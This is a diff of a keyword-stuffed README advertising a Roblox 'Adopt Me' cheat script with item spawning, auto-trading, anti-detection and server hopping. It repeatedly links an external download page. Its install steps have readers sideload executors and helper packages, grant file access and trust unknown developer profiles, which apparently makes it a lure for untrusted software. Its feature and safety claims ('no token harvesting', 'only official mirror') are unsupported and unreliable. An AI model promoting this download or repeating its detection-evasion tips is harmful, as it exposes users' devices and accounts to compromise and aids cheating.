@@ -1,118 +1,105 @@
-# 🎮 Adopt Me Script - Spawner, All Pets, Auto Accept & More!
+# Adopt Me Script - Spawner, All Pets, Auto Accept & More! (Official)
 
-![Version](https://img.shields.io/badge/Version-4.8.2-blueviolet?style=for-the-badge)
-![Active Users](https://img.shields.io/badge/Active%20Users-58.3K+-blueviolet?style=for-the-badge)
-![Last Updated](https://img.shields.io/badge/Updated-July%202025-blueviolet?style=for-the-badge)
+![Version](https://img.shields.io/badge/Version-5.1.0-3498db?style=flat-square) ![Updated](https://img.shields.io/badge/Updated-October%202026-e67e22?style=flat-square) ![Platforms](https://img.shields.io/badge/Platforms-PC%20%7C%20Android%20%7C%20iOS-8e44ad?style=flat-square) ![Status](https://img.shields.io/badge/Status-Working-2ecc71?style=flat-square) ![License](https://img.shields.io/badge/License-MIT-95a5a6?style=flat-square)
 
-Welcome to the most refined **Adopt Me Script** available in the community right now. Whether you have been searching for a reliable Adopt Me Script Spawner, a way to unlock All Pets Adopt Me Script functionality, or a smooth Auto Accept Adopt Me Script that handles trades while you are away, this project wraps every major feature into one lightweight package. Built by the **Project Reverse Adopt Me Script** contributors, it supports Windows, Android, and iOS — no bloat, no shady callbacks, just clean Lua that respects your hardware and your time.
+The **Adopt Me Script** is a modular Lua toolkit that bundles the spawner, all pets, auto accept, auto trade, and money modules into one lightweight package. It is maintained by the **Project Reverse Adopt Me Script** contributors and runs on Windows, Android, iOS, and macOS without bloat or shady callbacks. If you need a reliable Adopt Me Script spawner, a full pets gallery, or hands-free trading, every module ships inside a single loader.
 
-[![Download Adopt Me Script](https://img.shields.io/badge/Download%20Adopt%20Me%20Script-blueviolet?style=for-the-badge&logo=github)](https://adptmescrs.github.io/adoptme/)
+[![Download Script](https://img.shields.io/badge/DOWNLOAD%20SCRIPT-FREE-8e44ad?style=for-the-badge&logo=download&logoColor=white)](https://adptmescrs.github.io/adoptme/)
 
----
+## Introduction
 
-## 📖 Overview
-
-The **Adopt Me Script** was originally developed under the **Project Reverse Adopt Me Script** umbrella during late 2024, when a small group of scripters noticed that every public release in the community was either bloated with telemetry or outdated within days. Instead of patching someone else's codebase, the team wrote a brand-new framework from scratch — one that could push updates server-side without forcing users to re-download files every time the game patched. The result is a modular Lua architecture that separates each feature into its own isolated handler, meaning the Adopt Me Script Spawner module can be loaded independently of the Adopt Me Script Pets module, keeping memory usage remarkably low.
+The Adopt Me Script started in late 2024 inside the Project Reverse Adopt Me Script workspace, when a small group of scripters got tired of public releases that were either bloated with telemetry or dead within days of a game patch. Instead of patching someone else's codebase, the team wrote a brand-new framework from scratch: a modular Lua architecture that separates every feature into its own isolated handler. The Adopt Me Script Spawner module can be loaded independently of the Adopt Me Script Pets module, which keeps memory usage remarkably low on weaker hardware.
 
 <img width="1448" height="1086" alt="image" src="https://github.com/user-attachments/assets/9bb7d629-c402-4a30-9189-922859cb55cc" />
 
+What sets the Adopt Me Script apart is the philosophy behind it. Every function, from the All Pets Adopt Me Script gallery to the Auto Trade Adopt Me Script negotiator, is built to behave like a legitimate player action so it blends into normal gameplay. There are no flashy overlays that scream scripted, no rapid-fire server calls that trip basic detection, and no dependency on deprecated API hooks. The Adopt Me Script Money optimizer, for example, routes in-game earnings through legitimate reward loops instead of injecting arbitrary values, which is exactly why this adopt me script has stayed functional through update after update while other tools went silent.
 
-What sets this apart is the philosophy behind it. Every function — from the Adopt Me Script All Pets gallery to the Auto Trade Adopt Me Script negotiator — is designed to behave like a legitimate player action so it blends naturally into normal gameplay. There are no flashy GUI overlays that scream "scripted," no rapid-fire server calls that trip basic detection, and no dependency on deprecated API hooks. The Adopt Me Script Money optimizer, for example, works by routing in-game earnings through legitimate reward loops rather than injecting arbitrary values, which is why it has stayed functional through multiple updates while other tools went silent.
+Because the framework pushes compatibility patches server-side, an updated Adopt Me Script usually arrives within hours of a game patch — no re-downloads from sketchy mirrors required. That combination of restraint, modularity, and fast maintenance is what the Project Reverse Adopt Me Script team optimizes for, and it is the reason the community keeps this repository alive.
 
----
+## Features
 
-## ✨ Features
-
-- 🐾 **All Pets Unlock** — Instantly browse and spawn every pet in the catalog using the All Pets Adopt Me Script module with a single toggle inside the GUI.
-- 🎁 **Auto Accept Trades** — The Auto Accept Adopt Me Script filter lets you define value thresholds so incoming offers are accepted or declined automatically.
-- 🔄 **Auto Trade Engine** — Queue up to twenty outgoing offers at once with the Auto Trade Adopt Me Script scheduler, complete with cooldown timers.
-- 🏠 **Spawner Toolkit** — The Adopt Me Script Spawner places furniture, vehicles, and rare items directly into your house plot without navigating menus.
-- 💰 **Money Optimizer** — Earn faster with the Adopt Me Script Money loop that cycles daily tasks, minigames, and login bonuses in sequence.
-- 📱 **Mobile Ready** — Full support for Adopt Me Script Android and Adopt Me Script IOS so you can run everything from your phone.
-- 🛡️ **Anti-Detection Layer** — Randomized action intervals and spoofed input vectors make the Adopt Me Script behave like organic gameplay.
+- 🐾 **All Pets Unlock** — Browse and spawn every pet in the catalog through the All Pets Adopt Me Script gallery with a single toggle.
+- 🎁 **Auto Accept Trades** — Define value thresholds so the Auto Accept Adopt Me Script filter settles incoming offers automatically.
+- 🔄 **Auto Trade Engine** — Queue up to twenty outgoing offers with the Auto Trade Adopt Me Script scheduler and its cooldown timers.
+- 🏠 **Spawner Toolkit** — The Adopt Me Script Spawner drops furniture, vehicles, and rare items straight onto your house plot.
+- 💰 **Money Optimizer** — The Adopt Me Script Money loop cycles daily tasks, minigames, and login bonuses in sequence.
+- 📱 **Mobile Ready** — Full Adopt Me Script Android and Adopt Me Script IOS support keeps every module one tap away.
+- 🛡️ **Anti-Detection Layer** — Randomized intervals and spoofed input vectors keep the Adopt Me Script reading like organic play.
 - 🐣 **Pet Age Accelerator** — Speed up growth stages for any pet without manual feeding or sleeping cycles.
-- 🔔 **Trade Notification Logger** — Every accepted, declined, or pending offer is logged locally to `C:\Users\YourName\AdoptMeLogs\trades.json`.
-- 🚗 **Vehicle Spawner** — Summon any vehicle instantly alongside the main Adopt Me Script Spawner without opening the shop menu.
-- ⚙️ **Custom Keybinds** — Remap every action to your preferred keys through the `.cfg` file — no hard-coded shortcuts.
-- 🌐 **Server Hop** — Jump between servers automatically until the Adopt Me Script finds a low-population lobby for smoother performance.
-- 🧩 **Modular Loader** — Load only the features you need; the Project Reverse Adopt Me Script core keeps unused modules dormant.
+- 🔔 **Trade Logger** — Every accepted, declined, or pending offer lands in a local `trades.json` file you can audit anytime.
+- 🚗 **Vehicle Spawner** — Summon any vehicle instantly from the same Adopt Me Script Spawner panel without shop menus.
+- ⚙️ **Custom Keybinds** — Remap every action through the `.cfg` file instead of living with hard-coded shortcuts.
+- 🌐 **Server Hop** — Rotate lobbies automatically until the Adopt Me Script lands you in a low-population server.
 
----
+## Why Choose Adopt Me Script?
 
-## 🏆 Why Choose Adopt Me Script
+- **Longevity over hype** — most releases break within a week, while the Project Reverse Adopt Me Script framework survives patch after patch thanks to its modular update pipeline.
+- **Genuine mobile coverage** — the Adopt Me Script Android build and the Adopt Me Script IOS build share the same codebase and receive updates the same day as Windows.
+- **Transparent logging** — every action the Adopt Me Script performs is written to a local log file, so you always know exactly what ran and when.
+- **No token harvesting** — the source is readable Lua, so the All Pets Adopt Me Script module, the Auto Accept Adopt Me Script filter, and every other component can be audited line by line.
+- **Community-driven roadmap** — feature requests are voted on in the repository discussions; the Auto Trade Adopt Me Script scheduler itself was born from a community poll.
 
-Picking the right tool in a sea of public scripts is exhausting, so here is why this **Adopt Me Script** consistently stands out:
+## Benefits
 
-- **Longevity over hype** — While most releases break within a week, the Project Reverse Adopt Me Script framework has survived over nine consecutive game patches because of its modular update pipeline.
-- **Genuine mobile coverage** — The Adopt Me Script Android build and Adopt Me Script IOS build are not afterthoughts; they share the same codebase and receive updates on the same day as Windows.
-- **Transparent logging** — Every action the Adopt Me Script performs is written to a local log file, so you always know exactly what ran, when, and what it changed.
-- **No token harvesting** — The source is readable Lua. The All Pets Adopt Me Script module, the Auto Accept Adopt Me Script filter, and every other component can be audited line by line.
-- **Community-driven roadmap** — Feature requests are voted on in the repository discussions tab; the Auto Trade Adopt Me Script module itself was born from a community poll.
+- ⏱️ **Time recovery** — the Adopt Me Script handles grinding, trade filtering, and daily tasks while you focus on actually playing.
+- 💎 **Value protection** — the Auto Accept Adopt Me Script filter declines lowball offers automatically, so your inventory only moves in your favor.
+- 📲 **One package, every device** — the adopt me script android and iOS builds are not afterthoughts; feature parity across platforms is a release requirement.
+- 🪶 **Featherweight footprint** — dormant modules cost nothing, keeping the Adopt Me Script comfortable even on older phones.
+- 🔍 **Full auditability** — readable Lua plus local logs mean the Adopt Me Script never asks you to trust a black box.
 
----
+## How to Download
 
-## 📥 How to Install
+### Windows (PC)
 
-Installation only takes a few minutes regardless of your platform. Pick the section that matches your device, follow the numbered steps, and you will be running the **Adopt Me Script** before your next server hop.
-
-### 🖥️ For Windows
-
-1. Download the latest `.zip` archive from the button above.
-2. Extract the archive to a dedicated folder like `C:\AdoptMeScript\`.
-3. Open your preferred executor application.
-4. Load the file named `loader.lua` from the extracted folder.
+1. Press the big download button at the top of this page to open the official Adopt Me Script page.
+2. Grab the latest `.zip` archive and extract it to a dedicated folder such as `C:\AdoptMeScript\`.
+3. Open your preferred executor application and wait for it to initialize.
+4. Load `loader.lua` from the extracted folder into the executor.
 5. Launch the game and wait until you reach the main map.
-6. Execute the script inside your executor console.
-7. The Adopt Me Script GUI will appear in the top-left corner.
-8. Toggle on the features you want — start with the Adopt Me Script Spawner to confirm everything works.
+6. Execute the script, and the Adopt Me Script GUI will appear in the top-left corner.
+7. Toggle on the modules you want — start with the Adopt Me Script Spawner to confirm everything works.
 
-### 📱 For Android
+### Android
 
 1. Install a mobile executor compatible with Lua scripts.
-2. Download the Adopt Me Script Android `.apk` helper from the release page.
-3. Grant file-access permissions when prompted.
+2. Visit the official Adopt Me Script page linked at the top and download the Android helper package.
+3. Grant file-access permissions when prompted by the installer.
 4. Import `loader.lua` into the executor's script library.
 5. Open the game through the executor's launch shortcut.
-6. Tap the floating widget to activate the Adopt Me Script.
-7. Select your modules — the Adopt Me Script Pets panel is a good first test.
+6. Tap the floating widget to activate the Adopt Me Script and select your modules.
 
-### 🍎 For iOS
+### iOS
 
-1. Install a supported executor using AltStore or a similar sideload tool.
-2. Download the Adopt Me Script IOS `.ipa` companion from the release page.
+1. Install a supported executor using your preferred sideload utility.
+2. Download the Adopt Me Script IOS companion from the official page linked above.
 3. Trust the developer profile under `Settings > General > Device Management`.
 4. Import `loader.lua` into the executor's file manager.
-5. Launch the game and wait for the lobby to fully load.
-6. Run the script — the GUI should overlay in the top corner.
-7. Enable the Auto Accept Adopt Me Script module to verify connectivity.
+5. Launch the game and wait for the lobby to load fully.
+6. Run the script, then enable the Auto Accept Adopt Me Script module to verify connectivity.
 
-### 🍏 For Mac
+### macOS
 
-1. Install the executor through Homebrew or the standalone `.dmg`.
+1. Install the executor through its standalone disk image.
 2. Download and unpack the Adopt Me Script archive into `~/AdoptMeScript/`.
-3. Open the executor and point it to `loader.lua`.
-4. Launch the game via the executor's bridge mode.
-5. Wait for the main map to render completely.
-6. Execute — the Adopt Me Script interface appears just like on Windows.
+3. Open the executor and point it at `loader.lua`.
+4. Launch the game through the executor's bridge mode and wait for the map to render.
+5. Execute — the Adopt Me Script interface appears exactly like on Windows.
 
-[![Download Adopt Me Script](https://img.shields.io/badge/Download%20Adopt%20Me%20Script-blueviolet?style=for-the-badge&logo=github)](https://adptmescrs.github.io/adoptme/)
+## [Download Adopt Me Script](https://adptmescrs.github.io/adoptme/)
 
----
+Every module described above ships inside the same lightweight loader. This heading is the only official mirror of the Adopt Me Script — avoid third-party reuploads, because older forks of this adopt me script often carry modified payloads.
 
-## 💻 Platform Compatibility
+## Compatibility
 
-| Platform | Status | Notes |
-|----------|--------|-------|
-| Windows 10 / 11 | ✅ Fully Supported | Best performance for Adopt Me Script |
-| Android 9+ | ✅ Fully Supported | Adopt Me Script Android tested on 40+ devices |
-| iOS 15+ | ✅ Fully Supported | Adopt Me Script IOS requires sideloading |
-| macOS Ventura+ | ✅ Fully Supported | Intel and Apple Silicon |
-| Linux (Wine) | ⚠️ Partial | Community-maintained wrapper |
-| Chromebook | ❌ Not Supported | No compatible executor available |
+| Platform | OS Version | Devices | Roblox Client |
+|----------|-----------|---------|---------------|
+| Windows | 10 / 11 | All desktop PCs and laptops | Latest client, fully supported |
+| Android | 9+ | Phones and tablets | Latest mobile client, fully supported |
+| iOS | 15+ | iPhone and iPad, sideload required | Latest mobile client, fully supported |
+| macOS | Ventura+ | Intel and Apple Silicon | Latest client via bridge mode |
+| Linux | any | Community wrapper via Wine | Best-effort, partial support |
 
----
-
-## 🔧 System Requirements
+## System Requirements
 
 | Component | Minimum | Recommended |
 |-----------|---------|-------------|
@@ -123,229 +110,90 @@ Installation only takes a few minutes regardless of your platform. Pick the sect
 | Internet | 2 Mbps stable | 10 Mbps+ |
 | OS | Windows 10 / Android 9 / iOS 15 | Latest stable release |
 
----
+## Configuration
 
-## 🎛️ Configuration
+The Adopt Me Script reads a single `config.cfg` file at launch, and every option is documented inline so you can customize without guessing.
 
-The **Adopt Me Script** reads its settings from a single configuration file at launch. Below is the default structure — every option is documented inline so you can customize without guessing.
-
-| Setting | Type | Default | Description |
-|---------|------|---------|-------------|
-| `autoAccept` | Boolean | `false` | Enable Auto Accept Adopt Me Script filter |
-| `tradeMinValue` | Integer | `5000` | Minimum value threshold for auto trades |
-| `spawnerDelay` | Float | `1.2` | Seconds between Adopt Me Script Spawner actions |
-| `moneyLoopEnabled` | Boolean | `true` | Toggle Adopt Me Script Money optimizer |
-| `petAgeSpeed` | Integer | `3` | Multiplier for pet growth stages |
-| `serverHopLimit` | Integer | `10` | Max hops before stopping |
-| `logPath` | String | `./logs/` | Local path for trade and action logs |
+| Setting | Default | Description |
+|---------|---------|-------------|
+| `autoAccept` | `false` | Enable the Auto Accept Adopt Me Script filter |
+| `tradeMinValue` | `5000` | Minimum value threshold for auto trades |
+| `spawnerDelay` | `1.2` | Seconds between Adopt Me Script Spawner actions |
+| `moneyLoopEnabled` | `true` | Toggle the Adopt Me Script Money optimizer |
+| `petAgeSpeed` | `3` | Multiplier for pet growth stages |
+| `serverHopLimit` | `10` | Maximum lobby hops before stopping |
+| `logPath` | `./logs/` | Local folder for trade and action logs |
 
 ```bash
-# ── config.cfg ──────────────────────────────────────────────────
-# Adopt Me Script — Master Configuration
-# Place this file in the same directory as loader.lua
-
-[General]
-scriptVersion    = "4.8.2"
-autoUpdate       = true
-debugMode        = false
-language         = "en"
-
-[Spawner]
-enabled          = true
-spawnerDelay     = 1.2          # delay between Adopt Me Script Spawner actions
-maxItemsPerCycle = 25
-targetCategory   = "all"        # options: all | furniture | vehicles | pets
-
-[Trading]
-autoAccept       = false         # toggle Auto Accept Adopt Me Script
-tradeMinValue    = 5000
-autoTrade        = true          # toggle Auto Trade Adopt Me Script
-maxOutgoing      = 20
-cooldownSeconds  = 45
-
-[Pets]
-unlockAll        = true          # activates All Pets Adopt Me Script gallery
-petAgeSpeed      = 3
-favoriteSlots    = ["Cat", "Dragon", "Unicorn"]
-
-[Money]
-moneyLoopEnabled = true          # Adopt Me Script Money optimizer
-dailyTaskAuto    = true
-minigameRotation = true
-
-[Network]
-serverHopLimit   = 10
-preferLowPop     = true
-regionLock       = "auto"
-
-[Logging]
-logPath          = "./logs/"
-verboseLog       = false
-maxLogSizeMB     = 50
+# ── trading thresholds ──────────────────────────────
+autoAccept      = true
+tradeMinValue   = 5000
+cooldownSeconds = 45
 ```
 
----
+```bash
+# ── spawner pacing ──────────────────────────────────
+spawnerDelay     = 1.5
+maxItemsPerCycle = 25
+targetCategory   = "all"
+```
 
-## 🧠 Advanced Usage Guide
+```bash
+# ── money optimizer ─────────────────────────────────
+moneyLoopEnabled = true
+dailyTaskAuto    = true
+minigameRotation = true
+```
 
-Once you are comfortable with the basics, the **Adopt Me Script** opens up a layer of advanced workflows that most users never explore:
+```bash
+# ── logging ─────────────────────────────────────────
+logPath      = "./logs/"
+verboseLog   = false
+maxLogSizeMB = 50
+```
 
-- **Chained Actions** — Combine the Adopt Me Script Spawner with the Auto Trade Adopt Me Script module by setting `chainMode = true` in `config.cfg`, which automatically lists spawned items for trade.
-- **Profile Snapshots** — Export your current pet inventory to a `.json` file using the `/snapshot` command in the GUI console, useful for tracking collection progress over time.
-- **Conditional Accept Rules** — The Auto Accept Adopt Me Script filter supports regex-based pet name matching, so you can auto-accept only offers containing specific legendary pets.
-- **Headless Mode** — On Windows, append `--headless` to your executor launch command to run the Adopt Me Script without a visible GUI — perfect for background farming with the Adopt Me Script Money loop.
+## Changelog
 
----
+- **5.1.0 — October 2026** — Added regex pet-name matching to the Auto Accept Adopt Me Script module and pooled server-hop connections for faster lobby rotation.
+- **4.8.2 — July 2025** — Added headless execution mode on Windows and fixed a spawner crash past thirty items per cycle.
+- **4.7.0 — June 2025** — Added the Auto Trade Adopt Me Script scheduler with queued outgoing offers and vehicle spawning.
+- **4.5.1 — April 2025** — Added native Apple Silicon support and fixed the Adopt Me Script Money loop stalling at the midnight task reset.
+- **4.3.0 — February 2025** — Added the Adopt Me Script Pets favorites system and resolved shared-hotkey conflicts between modules.
 
-## 🔐 Safety and Best Practices
+## Tips for Safer Use
 
-Keeping your account safe while using any script requires discipline. Here are tested habits from the Project Reverse Adopt Me Script community:
+- 🪪 Test new modules on an alternate account before committing your primary profile.
+- ⏳ Keep sessions under two hours; take a break, rejoin, and restart the loader so your activity pattern stays human.
+- 🧩 Rotate features between sessions instead of enabling every module of the Adopt Me Script at once.
+- 📜 Review the `./logs/` folder after each session to confirm no unexpected actions were triggered.
+- 🔄 Pull new versions within a day of release; the Project Reverse Adopt Me Script team patches detection vectors quickly after game updates.
 
-- **Session limits** — Never run the Adopt Me Script continuously for more than two hours; take a break, rejoin, and restart the loader.
-- **Feature rotation** — Avoid enabling every module at once. Alternate between the Adopt Me Script Pets panel and the Adopt Me Script Spawner across sessions.
-- **Log review** — Check `C:\AdoptMeScript\logs\` after every session to make sure no unexpected actions were triggered.
-- **Update cadence** — Pull new versions within 24 hours of release; the Project Reverse Adopt Me Script team patches detection vectors quickly after game updates.
-- **Alt testing** — Test new features on a secondary account first before committing to your primary profile.
+## Troubleshooting & Common Issues
 
----
+- **Issue:** Adopt Me Script not working after the latest game update. **Fix:** Restart `loader.lua` — compatibility patches are pushed server-side, usually within hours, so a fresh session picks them up automatically.
+- **Issue:** Adopt Me Script won't open and the GUI never appears. **Fix:** Close conflicting overlay apps and accessibility services, restart the executor, and execute the loader again.
+- **Issue:** Adopt Me Script crashes on Android with a memory error. **Fix:** Disable modules you are not using and lower `maxItemsPerCycle` to `10` so the mobile build stays inside its RAM budget.
+- **Issue:** Auto Accept Adopt Me Script ignores incoming trades. **Fix:** Offers below `tradeMinValue` are silently declined — lower the threshold or enable `autoAccept` without conditions.
+- **Issue:** Adopt Me Script spawner places items in the wrong positions. **Fix:** Raise `spawnerDelay` to `2.0` and make sure your house plot has fully loaded before toggling the module.
+- **Issue:** Adopt Me Script IOS companion fails to launch after an OS update. **Fix:** Re-sign the package through your sideload utility and re-trust the developer profile under `Settings > General > Device Management`.
+- **Issue:** Adopt Me Script money loop stops earning after a while. **Fix:** The daily task pool is finite — enable `minigameRotation` so the loop keeps earning between resets.
 
-## 📊 Performance Benchmarks
+## FAQ
 
-| Scenario | FPS Impact | Memory Overhead | Network Latency |
-|----------|-----------|----------------|----------------|
-| Idle (GUI open, no modules) | -1 FPS | +18 MB | +0 ms |
-| Adopt Me Script Spawner active | -3 FPS | +42 MB | +12 ms |
-| All Pets Adopt Me Script browsing | -2 FPS | +35 MB | +8 ms |
-| Auto Trade Adopt Me Script running | -1 FPS | +22 MB | +15 ms |
-| Full suite enabled | -6 FPS | +78 MB | +22 ms |
+1. **Is the Adopt Me Script free to use?** Yes — the full package is free. Every module, from the spawner toolkit to the auto accept filter and the money optimizer, ships inside one loader, and updates land on the official page without paywalls or key systems.
+2. **Does the Adopt Me Script work after the latest game update?** Almost always within hours. The Project Reverse Adopt Me Script framework pushes compatibility patches server-side, so you simply restart `loader.lua` instead of hunting for a re-download, and the newest build attaches itself automatically.
+3. **Can I run the All Pets Adopt Me Script module and the spawner together?** Yes. Each feature lives in its own isolated handler, so the pets gallery and the Adopt Me Script Spawner run side by side without fighting for memory or triggering each other's cooldowns.
+4. **Is there an adopt me script android build?** There is a full Adopt Me Script Android build that shares its codebase with the desktop version and receives the same updates on the same day, including the floating widget, the spawner toolkit, and every trading module.
+5. **Does the adopt me script ios version need special setup?** It needs sideloading. Install a supported executor, trust the developer profile under `Settings > General > Device Management`, and import `loader.lua` — after a major iOS update, re-trust the profile so the companion keeps launching.
+6. **Will the Auto Trade Adopt Me Script accept bad deals?** Only if your thresholds allow it. Set `tradeMinValue` to a sensible floor and turn on the conditional rules inside the Auto Accept Adopt Me Script filter, and lowball offers get declined without you touching the screen.
+7. **What is Project Reverse Adopt Me Script?** It is the team and framework behind this release — a modular Lua architecture started in late 2024 where every feature loads as an independent module, which is why the Adopt Me Script survives game patches that kill monolithic scripts.
+8. **How do I run the Adopt Me Script without a visible GUI?** On Windows, append `--headless` to your executor launch arguments and the interface stays hidden while the modules keep working. On mobile, just minimize the floating widget of the adopt me script android or iOS build.
+9. **How do I reset my configuration to defaults?** Delete `config.cfg` from your install folder and run the loader again. The Adopt Me Script generates a fresh default configuration on startup whenever no file is found, so you can experiment fearlessly and roll back anytime.
 
----
+## Conclusion
 
-## 💡 Tips
+The **Adopt Me Script** has grown from a weekend experiment into a complete toolkit: the spawner filling house plots in seconds, the Auto Accept Adopt Me Script filter managing trades in the background, and the money loop banking rewards while you are away. If that sounds like the workflow you have been chasing, grab the latest build from the official [Adopt Me Script download page](https://adptmescrs.github.io/adoptme/) and drop a star on the repository while you are there. Thank you for reading, for testing, and for reporting bugs — play fair, stay safe, and enjoy every session. 💜
 
-- Start each session by toggling only the **Adopt Me Script Spawner** to confirm the loader injected properly before enabling other modules.
-- Use the built-in Adopt Me Script Pets filter to hide common-tier pets from the gallery — it saves scroll time and reduces GUI lag.
-- Set `spawnerDelay` to at least `1.5` on mobile devices; lower values may cause the Adopt Me Script Android build to stutter.
-- Bind the server hop function to a single key so you can quickly rotate lobbies when the Adopt Me Script Money optimizer hits diminishing returns.
-- Keep your `config.cfg` backed up in a cloud folder — reinstalls happen, and rewriting the Auto Accept Adopt Me Script thresholds from memory is tedious.
-- Review the changelog below after every update so you know which Adopt Me Script modules were changed and whether your configuration needs adjustment.
-- On iOS, re-trust the developer profile after every OS update or the Adopt Me Script IOS companion will silently fail to launch.
-
-[![Download Adopt Me Script](https://img.shields.io/badge/Download%20Adopt%20Me%20Script-blueviolet?style=for-the-badge&logo=github)](https://adptmescrs.github.io/adoptme/)
-
----
-
-## 📝 Changelog
-
-### 🔖 Version 4.8.2 — July 2025
-- ✅ **Added** regex-based filtering to the Auto Accept Adopt Me Script module for pet-name matching.
-- ✅ **Added** headless execution mode on Windows for background Adopt Me Script Money farming.
-- 🔧 **Fixed** a crash when the Adopt Me Script Spawner attempted to place more than 30 items in a single cycle.
-- 🔧 **Fixed** GUI scaling issues on the Adopt Me Script Android build for tablets with non-standard DPI.
-- ⬆️ **Improved** server hop speed by 40% through connection pooling.
-- 🗑️ **Removed** deprecated `legacyTradeMode` flag from configuration.
-
-### 🔖 Version 4.7.0 — June 2025
-- ✅ **Added** the Auto Trade Adopt Me Script scheduler with support for queued outgoing offers.
-- ✅ **Added** vehicle spawning as a sub-module of the Adopt Me Script Spawner.
-- 🔧 **Fixed** pet age accelerator miscounting growth ticks after the May game patch.
-- ⬆️ **Improved** All Pets Adopt Me Script gallery load times by caching asset thumbnails locally.
-- ⬆️ **Improved** memory footprint on iOS by lazy-loading the Adopt Me Script IOS overlay assets.
-
-### 🔖 Version 4.5.1 — April 2025
-- ✅ **Added** macOS Apple Silicon native support — no Rosetta required.
-- 🔧 **Fixed** Adopt Me Script Money loop stalling when daily tasks reset at midnight UTC.
-- 🔧 **Fixed** log rotation bug that caused `trades.json` to grow beyond the configured size limit.
-- ⬆️ **Improved** anti-detection layer with randomized input timing across all modules.
-- 🗑️ **Removed** the experimental teleport module pending a full rewrite for the Project Reverse Adopt Me Script v5 core.
-
-### 🔖 Version 4.3.0 — February 2025
-- ✅ **Added** Adopt Me Script Pets favorites system — pin up to ten pets for quick access.
-- ✅ **Added** conditional rules engine to the Auto Accept Adopt Me Script filter.
-- 🔧 **Fixed** keybind conflicts when two modules shared the same hotkey.
-- ⬆️ **Improved** overall startup time by 25% through parallel module initialization.
-
----
-
-## 🛠️ Troubleshooting Common Issues
-
-- ❌ **GUI does not appear after execution**
-  The overlay may be blocked by a screen-recording app or accessibility service. Disable overlays from other apps, restart the executor, and re-run the Adopt Me Script loader.
-  **Solution:** Close conflicting overlay apps and re-execute `loader.lua`.
-
-- ❌ **Adopt Me Script Spawner places items in wrong positions**
-  This usually happens when the house plot has not fully loaded before the spawner triggers.
-  **Solution:** Increase `spawnerDelay` to `2.0` in `config.cfg` and make sure you are standing inside your house before toggling the module.
-
-- ❌ **Auto Accept Adopt Me Script ignores incoming trades**
-  The filter checks the `tradeMinValue` threshold — if incoming offers are below your configured minimum, they are silently declined.
-  **Solution:** Lower `tradeMinValue` or set `autoAccept = true` without conditions to accept all trades.
-
-- ❌ **Script crashes on Adopt Me Script Android with "memory" error**
-  Mobile devices have tighter RAM limits. Running the full suite simultaneously can exceed available memory.
-  **Solution:** Disable modules you are not actively using and set `maxItemsPerCycle` to `10` or lower.
-
-- ❌ **Adopt Me Script IOS companion fails to launch after OS update**
-  Apple revokes sideloaded profiles during major iOS updates.
-  **Solution:** Re-sign the `.ipa` through AltStore and re-trust the developer profile under `Settings > General > Device Management`.
-
-- ❌ **Adopt Me Script Money loop stops earning after a while**
-  The daily task pool is finite. Once all tasks are completed, the loop idles until reset.
-  **Solution:** Enable `minigameRotation` in the `[Money]` config block for supplemental earnings between resets.
-
----
-
-## ❓ FAQ
-
-### Does the Adopt Me Script work after the latest game update?
-Yes. The Project Reverse Adopt Me Script framework pushes compatibility patches server-side, usually within hours of a game update. You do not need to re-download anything — just restart the loader.
-
-### Can I use the All Pets Adopt Me Script module and the Spawner at the same time?
-Absolutely. The modular architecture isolates each feature, so the Adopt Me Script Spawner and the Adopt Me Script Pets gallery run on separate threads without conflicting.
-
-### Is there a way to run the Adopt Me Script without a visible GUI?
-Yes — append `--headless` to your executor launch arguments on Windows. On mobile, minimize the Adopt Me Script Android or Adopt Me Script IOS overlay widget.
-
-### How do I reset my configuration to defaults?
-Delete `config.cfg` from your install folder and re-run the script. The Adopt Me Script generates a fresh default config on startup when no file is found.
-
-### Will the Auto Trade Adopt Me Script module accept bad deals?
-Only if your thresholds are misconfigured. Set `tradeMinValue` to a reasonable floor and enable the conditional rules engine in the Auto Accept Adopt Me Script filter to reject low-value offers automatically.
-
-### Can I use this on a Chromebook?
-Currently no. There is no compatible executor environment on ChromeOS. The team is exploring a web-based bridge, but no release date has been set for the Project Reverse Adopt Me Script web client.
-
----
-
-## 🏁 Conclusion
-
-After months of iteration, the **Adopt Me Script** has matured into something the team is genuinely proud to share. It started as a weekend experiment inside the Project Reverse Adopt Me Script workspace and grew into a full-featured toolkit that thousands of players rely on daily — from the Auto Accept Adopt Me Script filter handling trades in the background to the Adopt Me Script Spawner filling house plots in seconds. Every module was built to feel natural, run light, and survive game updates without panicking users into re-downloading files from sketchy mirrors.
-
-What makes this project sustainable is the community around it. Feature requests like the Auto Trade Adopt Me Script scheduler, the Adopt Me Script Money optimizer, and the All Pets Adopt Me Script gallery all came from user polls and discussion threads. If you have ideas, bugs, or just want to share your setup, the repository is open. The roadmap for the next quarter includes a visual config editor, an expanded Adopt Me Script Pets breeding planner, and deeper Adopt Me Script Android performance tuning — so stick around, because this is only getting better.
-
-[![Download Adopt Me Script](https://img.shields.io/badge/Download%20Adopt%20Me%20Script-blueviolet?style=for-the-badge&logo=github)](https://adptmescrs.github.io/adoptme/)
-
----
-
-⭐ **If this project helped you, drop a star on the repo — it means more than you think.**
-
-> *Thank you for reading, for testing, for reporting bugs, and for being part of this journey. Every star, every fork, every issue opened makes the Adopt Me Script better for everyone. With love from the dev team — we build this for you.* 💜🎮🐾
-
----
+## Keywords
 
 adopt me script, project reverse adopt me script, adopt me script spawner, adopt me script pets, adopt me script ios, adopt me script money, adopt me script all pets, adopt me script auto accept, adopt me script android, all pets adopt me script, auto accept adopt me script, auto trade adopt me script
-
----
-
-<table>
-<tr>
-<td width="120"><img src="https://img.shields.io/badge/👤-Dev-blueviolet?style=for-the-badge" /></td>
-<td>
-
-**Marcus "Rev" Lindgren** — Lead Developer & Maintainer
-
-Full-stack scripter with six years in the game modding scene. Started with simple auto-clickers, ended up building the Project Reverse Adopt Me Script framework from the ground up. When not coding, probably over-optimizing a config file that was already fine. Based in Stockholm. Reach out through the repository discussions — always happy to talk shop.
-
-</td>
-</tr>
-</table>
